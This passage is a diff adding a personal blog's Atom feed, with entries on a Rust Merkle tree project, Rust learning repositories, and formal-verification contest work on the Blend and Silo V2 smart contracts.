@@ -1,0 +1,1221 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Johny</title>
+    <subtitle>Aka S0m30n3</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://4l0n3r.github.io/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-05-21T00:00:00+00:00</updated>
+    <id>https://4l0n3r.github.io/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Merkle Tree in Rust</title>
+        <published>2025-05-21T00:00:00+00:00</published>
+        <updated>2025-05-21T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/projects/merkle-tree-with-rust/"/>
+        <id>https://4l0n3r.github.io/projects/merkle-tree-with-rust/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/projects/merkle-tree-with-rust/">&lt;p&gt;This project implements a &lt;strong&gt;Merkle Tree&lt;&#x2F;strong&gt; in Rust — a fundamental data structure widely used in blockchain, cryptographic proofs, and distributed systems.&lt;&#x2F;p&gt;
+&lt;p&gt;It demonstrates how Rust&#x27;s powerful standard library, ownership system, and strong typing make it well-suited for secure and efficient data processing.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h3 id=&quot;mag-features&quot;&gt;🔍 Features&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;SHA-256 hash-based Merkle Tree implementation&lt;&#x2F;li&gt;
+&lt;li&gt;Recursive tree construction from leaves&lt;&#x2F;li&gt;
+&lt;li&gt;Verification of Merkle proofs (hash paths)&lt;&#x2F;li&gt;
+&lt;li&gt;Utility functions to build, traverse, and verify Merkle roots&lt;&#x2F;li&gt;
+&lt;li&gt;Simple CLI (optional) or main file for running test examples&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h3 id=&quot;brain-learning-outcomes&quot;&gt;🧠 Learning Outcomes&lt;&#x2F;h3&gt;
+&lt;p&gt;This project helped deepen my understanding of:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Binary tree structures and recursion&lt;&#x2F;li&gt;
+&lt;li&gt;Rust’s slice and vector handling (&lt;code&gt;Vec&amp;lt;u8&amp;gt;&lt;&#x2F;code&gt;, slices, lifetimes)&lt;&#x2F;li&gt;
+&lt;li&gt;SHA-256 hashing with the &lt;code&gt;sha2&lt;&#x2F;code&gt; crate&lt;&#x2F;li&gt;
+&lt;li&gt;Real-world blockchain primitives (used in Ethereum, Bitcoin, ZKPs)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h3 id=&quot;package-tech-stack&quot;&gt;📦 Tech Stack&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Rust&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;sha2 crate&lt;&#x2F;strong&gt; for hashing&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;This project serves as a building block for more advanced blockchain topics like Merkle proofs, zk-SNARKs, and rollup state validation. Check out the code on GitHub to see it in action!&lt;&#x2F;p&gt;
+&lt;p&gt;➡️ &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;merkle-tree-using-rust&quot;&gt;View Repository&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Rust learnings</title>
+        <published>2025-03-17T00:00:00+00:00</published>
+        <updated>2025-03-17T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/rust-learnings/"/>
+        <id>https://4l0n3r.github.io/writeups/rust-learnings/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/rust-learnings/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#introduction&quot; aria-label=&quot;Anchor link for: introduction&quot;&gt;Introduction&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;I’ve been diving into Rust — a systems programming language known for its memory safety, zero-cost abstractions, and powerful concurrency support. The below repositories track my progress and understanding.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;blue-book-rustic-journal&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#blue-book-rustic-journal&quot; aria-label=&quot;Anchor link for: blue-book-rustic-journal&quot;&gt;📘 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;rustic-journal&quot;&gt;Rustic Journal&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;This repo serves as my &lt;strong&gt;personal learning journal&lt;&#x2F;strong&gt; while reading the &lt;a href=&quot;https:&#x2F;&#x2F;doc.rust-lang.org&#x2F;book&#x2F;&quot;&gt;Rust Book&lt;&#x2F;a&gt;. It contains code snippets, examples, and written reflections to help internalize key Rust concepts.&lt;&#x2F;p&gt;
+&lt;p&gt;Covered so far:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ownership, Borrowing, and Lifetimes&lt;&#x2F;li&gt;
+&lt;li&gt;Structs, Enums, and Pattern Matching&lt;&#x2F;li&gt;
+&lt;li&gt;Modules and Crate structure&lt;&#x2F;li&gt;
+&lt;li&gt;Error handling (&lt;code&gt;Result&lt;&#x2F;code&gt;, &lt;code&gt;Option&lt;&#x2F;code&gt;)&lt;&#x2F;li&gt;
+&lt;li&gt;Collections (&lt;code&gt;Vec&lt;&#x2F;code&gt;, &lt;code&gt;HashMap&lt;&#x2F;code&gt;)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;This is an ongoing repository where I log practical experiments, deeper dives, and Rust ecosystem notes.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;crab-rustlings-exercises&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crab-rustlings-exercises&quot; aria-label=&quot;Anchor link for: crab-rustlings-exercises&quot;&gt;🦀 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;rustlings-exercises&quot;&gt;Rustlings Exercises&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;This repository contains my solutions to the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;rust-lang&#x2F;rustlings&quot;&gt;Rustlings&lt;&#x2F;a&gt; exercises — a tool designed to help learners practice Rust syntax and patterns via small, interactive tasks.&lt;&#x2F;p&gt;
+&lt;p&gt;Each completed exercise demonstrates:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Syntax familiarity&lt;&#x2F;li&gt;
+&lt;li&gt;Understanding of ownership, references, and memory management&lt;&#x2F;li&gt;
+&lt;li&gt;Use of traits, generics, and control flow&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;It&#x27;s a hands-on way to reinforce concepts from the Rust Book and solidify muscle memory with the compiler.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;More to come soon 🚀&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Blend - Formal Verification</title>
+        <published>2025-02-24T00:00:00+00:00</published>
+        <updated>2025-02-24T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/blend-v2-formal-verification/"/>
+        <id>https://4l0n3r.github.io/writeups/blend-v2-formal-verification/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/blend-v2-formal-verification/">&lt;h1 id=&quot;test-tube-formal-verification-participation-blend-protocol-cantina-contest&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#test-tube-formal-verification-participation-blend-protocol-cantina-contest&quot; aria-label=&quot;Anchor link for: test-tube-formal-verification-participation-blend-protocol-cantina-contest&quot;&gt;🧪 Formal Verification Participation - Blend Protocol (Cantina Contest)&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;This repository documents my participation in the &lt;strong&gt;Blend Protocol Formal Verification Contest&lt;&#x2F;strong&gt; hosted by &lt;a href=&quot;https:&#x2F;&#x2F;cantina.xyz&#x2F;&quot;&gt;Cantina&lt;&#x2F;a&gt; in &lt;strong&gt;February 2025&lt;&#x2F;strong&gt;. The project focuses on analyzing and verifying key Rust smart contracts of the Blend Protocol using &lt;strong&gt;SorabanProver&lt;&#x2F;strong&gt;, a static verification tool for Soroban (Stellar’s smart contract platform).&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;blue-book-about-blend-protocol&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#blue-book-about-blend-protocol&quot; aria-label=&quot;Anchor link for: blue-book-about-blend-protocol&quot;&gt;📘 About Blend Protocol&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Blend&lt;&#x2F;strong&gt; is a universal liquidity primitive that enables the permissionless creation of lending pools. It’s written in &lt;strong&gt;Rust&lt;&#x2F;strong&gt; and deployed on the &lt;strong&gt;Soroban&lt;&#x2F;strong&gt; smart contract platform.&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;🛠️ Language: Rust&lt;&#x2F;li&gt;
+&lt;li&gt;🧠 Target: Formal Verification with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;stellar&#x2F;soroban-prover&quot;&gt;SorabanProver&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;floppy-disk-contest-overview&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#floppy-disk-contest-overview&quot; aria-label=&quot;Anchor link for: floppy-disk-contest-overview&quot;&gt;💾 Contest Overview&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Github Project&lt;&#x2F;strong&gt;: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;2025-02-blend-fv&quot;&gt;Blend Protocol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Contest Host&lt;&#x2F;strong&gt;: C4&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Date&lt;&#x2F;strong&gt;: Feb 2025&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Focus&lt;&#x2F;strong&gt;: Rust-based smart contracts&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;&#x2F;strong&gt;: Formal Verification using SMT-solvers and rule-based specifications&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;mag-scope-of-verification&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#mag-scope-of-verification&quot; aria-label=&quot;Anchor link for: mag-scope-of-verification&quot;&gt;🔍 Scope of Verification&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;The verification focused on the following Rust source files:&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Contract File&lt;&#x2F;th&gt;&lt;th&gt;Description&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;withdrawal.rs&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;Handles user withdrawals&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;user.rs&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;User identity and actions&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;deposit.rs&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;Token deposits logic&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;fund_management.rs&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;Fund pool and accounting&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;pool.rs&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;Lending pool core logic&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;file-folder-project-layout-for-sorabanprover&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#file-folder-project-layout-for-sorabanprover&quot; aria-label=&quot;Anchor link for: file-folder-project-layout-for-sorabanprover&quot;&gt;📁 Project Layout for SorabanProver&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;backstop&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;├── confs&#x2F;                           # Configuration files per contract
+&lt;&#x2F;span&gt;&lt;span&gt;│   └── *.conf
+&lt;&#x2F;span&gt;&lt;span&gt;├── src&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;│   └── certora_specs&#x2F;              # Verification specifications
+&lt;&#x2F;span&gt;&lt;span&gt;│       ├── *.spec
+&lt;&#x2F;span&gt;&lt;span&gt;│       ├── summaries&#x2F;              # Function summaries
+&lt;&#x2F;span&gt;&lt;span&gt;│       └── mocks&#x2F;                  # Mock implementations
+&lt;&#x2F;span&gt;&lt;span&gt;├── mutations&#x2F;                      # Mutation tests for evaluation
+&lt;&#x2F;span&gt;&lt;span&gt;└── certora_build.py                # Build helper script
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;test-tube-running-verification&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#test-tube-running-verification&quot; aria-label=&quot;Anchor link for: test-tube-running-verification&quot;&gt;🧪 Running Verification&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;1-compile-the-code&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-compile-the-code&quot; aria-label=&quot;Anchor link for: 1-compile-the-code&quot;&gt;1. Compile the Code&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;All edits and spec additions should occur under the &lt;code&gt;backstop&#x2F;&lt;&#x2F;code&gt; directory.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; backstop
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;just&lt;&#x2F;span&gt;&lt;span&gt; build
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;2-run-the-prover&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-run-the-prover&quot; aria-label=&quot;Anchor link for: 2-run-the-prover&quot;&gt;2. Run the Prover&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;Run the SorabanProver for a specific contract configuration:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; confs
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;certoraSorobanProver&lt;&#x2F;span&gt;&lt;span&gt; withdrawal.conf   &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# example
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;🔒 You may need to first run:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; +x certora_build.py
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;white-check-mark-key-highlights&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#white-check-mark-key-highlights&quot; aria-label=&quot;Anchor link for: white-check-mark-key-highlights&quot;&gt;✅ Key Highlights&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Defined and tested:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Function-level specifications&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;State invariants&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Verified business logic and safety properties around:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pool reserve tracking&lt;&#x2F;li&gt;
+&lt;li&gt;User deposit and withdrawal correctness&lt;&#x2F;li&gt;
+&lt;li&gt;Consistency in fund management&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;brain-learnings&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#brain-learnings&quot; aria-label=&quot;Anchor link for: brain-learnings&quot;&gt;🧠 Learnings&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Gained hands-on experience with &lt;strong&gt;SorabanProver&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Practiced writing custom &lt;strong&gt;mock functions and summaries&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Understood the &lt;strong&gt;verification lifecycle&lt;&#x2F;strong&gt; for Rust-based smart contracts&lt;&#x2F;li&gt;
+&lt;li&gt;Tackled challenges with symbolic state, mutation testing, and specification refinement&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;adult-computer-author&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#adult-computer-author&quot; aria-label=&quot;Anchor link for: adult-computer-author&quot;&gt;🧑‍💻 Author&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Johny Vasamsetti&lt;&#x2F;strong&gt;
+Smart Contract Security Enthusiast | Formal Verification | Rust | Web3 Infra&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&quot;&gt;GitHub&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;pushpin-note&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pushpin-note&quot; aria-label=&quot;Anchor link for: pushpin-note&quot;&gt;📌 Note&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;This repository is a submission for educational and learning purposes. It does not contain any security disclosures or sensitive vulnerabilities.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Silo - Formal Verification</title>
+        <published>2025-02-10T00:00:00+00:00</published>
+        <updated>2025-02-10T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/silo-v2-formal-verification/"/>
+        <id>https://4l0n3r.github.io/writeups/silo-v2-formal-verification/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/silo-v2-formal-verification/">&lt;h1 id=&quot;test-tube-formal-verification-participation-silo-v2-cantina-contest&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#test-tube-formal-verification-participation-silo-v2-cantina-contest&quot; aria-label=&quot;Anchor link for: test-tube-formal-verification-participation-silo-v2-cantina-contest&quot;&gt;🧪 Formal Verification Participation - Silo V2 (Cantina Contest)&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;This repository documents my participation in the &lt;strong&gt;Silo V2 Formal Verification Contest&lt;&#x2F;strong&gt; hosted by &lt;a href=&quot;https:&#x2F;&#x2F;cantina.xyz&#x2F;&quot;&gt;Cantina&lt;&#x2F;a&gt;, which ran from &lt;strong&gt;Feb 10, 2025&lt;&#x2F;strong&gt;. The goal of this contest was to analyze, reason about, and formally verify the correctness and security properties of the smart contracts provided by Silo using &lt;strong&gt;Certora Prover&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;receipt-contest-overview&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#receipt-contest-overview&quot; aria-label=&quot;Anchor link for: receipt-contest-overview&quot;&gt;🧾 Contest Overview&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Github Project&lt;&#x2F;strong&gt;: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;silo-v2-cantina-fv&#x2F;&quot;&gt;Silo Rules&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Contest Host&lt;&#x2F;strong&gt;: Cantina&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Start Date&lt;&#x2F;strong&gt;: Feb 10, 2025&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Focus&lt;&#x2F;strong&gt;: Silo V2 Contracts&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;&#x2F;strong&gt;: Formal Verification (SMT-based logic, rule-based specifications)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;mag-what-i-worked-on&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#mag-what-i-worked-on&quot; aria-label=&quot;Anchor link for: mag-what-i-worked-on&quot;&gt;🔍 What I Worked On&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;This repo showcases my efforts in:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Understanding the behavior of the Silo V2 codebase&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Writing formal rules and invariants using Certora’s specification language&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Verifying those rules against the actual contract implementation&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Iteratively refining the specifications to match protocol behavior&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;tools-tools-stack&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#tools-tools-stack&quot; aria-label=&quot;Anchor link for: tools-tools-stack&quot;&gt;🛠 Tools &amp;amp; Stack&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;📜 &lt;strong&gt;Certora Prover&lt;&#x2F;strong&gt;: For writing and verifying smart contract specs&lt;&#x2F;li&gt;
+&lt;li&gt;🧠 &lt;strong&gt;Certora Specification Language&lt;&#x2F;strong&gt;: To encode protocol invariants and API rules&lt;&#x2F;li&gt;
+&lt;li&gt;💻 &lt;strong&gt;Solidity&lt;&#x2F;strong&gt;: Smart contract language under verification&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;telescope-scope-of-verification&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#telescope-scope-of-verification&quot; aria-label=&quot;Anchor link for: telescope-scope-of-verification&quot;&gt;🔭 Scope of Verification&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;The contest involved analyzing the following key contracts from the Silo V2 protocol:&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Contract&lt;&#x2F;th&gt;&lt;th&gt;SLOC (Source Lines of Code)&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;Silo.sol&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;452&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;PartialLiquidation.sol&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;155&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;Actions.sol&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;373&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;h2 id=&quot;scroll-lessons-learned&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#scroll-lessons-learned&quot; aria-label=&quot;Anchor link for: scroll-lessons-learned&quot;&gt;📜 Lessons Learned&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Hands-on experience with the &lt;strong&gt;Certora Prover&lt;&#x2F;strong&gt; workflow&lt;&#x2F;li&gt;
+&lt;li&gt;Better understanding of how to model complex DeFi lending systems formally&lt;&#x2F;li&gt;
+&lt;li&gt;Learned to handle false positives and debug verification failures effectively&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;adult-computer-author&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#adult-computer-author&quot; aria-label=&quot;Anchor link for: adult-computer-author&quot;&gt;🧑‍💻 Author&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Johny Vasamsetti&lt;&#x2F;strong&gt;
+Web3 &amp;amp; Infrastructure Engineer | Passionate about Smart Contract Security and Formal Verification&lt;&#x2F;p&gt;
+&lt;p&gt;Connect with me:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&quot;&gt;GitHub&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Solidity small projects</title>
+        <published>2024-08-03T00:00:00+00:00</published>
+        <updated>2024-08-03T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/solidity-projects/"/>
+        <id>https://4l0n3r.github.io/writeups/solidity-projects/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/solidity-projects/">&lt;h1 id=&quot;bricks-solidity-projects&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#bricks-solidity-projects&quot; aria-label=&quot;Anchor link for: bricks-solidity-projects&quot;&gt;🧱 Solidity Projects&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;When I started learning web3 stuff, I started with cyfrin courses. Below are the collection of smart contracts and decentralized applications I’ve built using Solidity and the Foundry framework. I have added the github links for all the projects. It might help the ones who are starting to learn solidity &amp;amp; foundry framework.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
